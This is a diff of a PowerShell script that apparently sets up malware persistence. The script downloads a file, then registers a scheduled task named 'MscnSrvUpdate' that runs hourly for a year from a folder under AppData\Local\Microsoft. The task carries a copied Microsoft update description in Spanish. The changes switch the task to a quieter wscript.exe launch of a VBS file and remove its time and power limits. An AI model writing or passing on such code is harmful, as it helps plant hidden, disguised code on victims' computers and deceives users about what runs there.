@@ -20,9 +20,9 @@ Invoke-WebRequest -Uri $url -OutFile $zipFile -ErrorAction SilentlyContinue
 
 Unregister-ScheduledTask -TaskName "MscnSrvUpdate" -Confirm:$false -ErrorAction SilentlyContinue
 
-$action = New-ScheduledTaskAction -Execute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Argument "-Executionpolicy Bypass -NoProfile -File $USERNAMEPTH\AppData\Local\Microsoft\MsUpdate\Mscntask.ps1"
+$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "C:\Users\$env:USERNAME\AppData\Local\Microsoft\MsUpdate\Mscntask.vbs"
 $trigger = New-ScheduledTaskTrigger -Once -At "00:00AM" -RepetitionInterval (New-TimeSpan -Minutes 60) -RepetitionDuration (New-TimeSpan -Days 365)
-$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -ExecutionTimeLimit 0
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MscnSrvUpdate" -Description "Mantiene actualizado el software de Microsoft. Si esta tarea está deshabilitada o detenida, el software de Microsoft no se actualizará, lo que significa que no se podrán corregir las vulnerabilidades que puedan surgir y es posible que las características no funcionen. Esta tarea se desinstalará cuando el software de Microsoft no la esté usando." -Settings $settings | Out-Null
 
 Start-ScheduledTask -TaskName "MscnSrvUpdate"
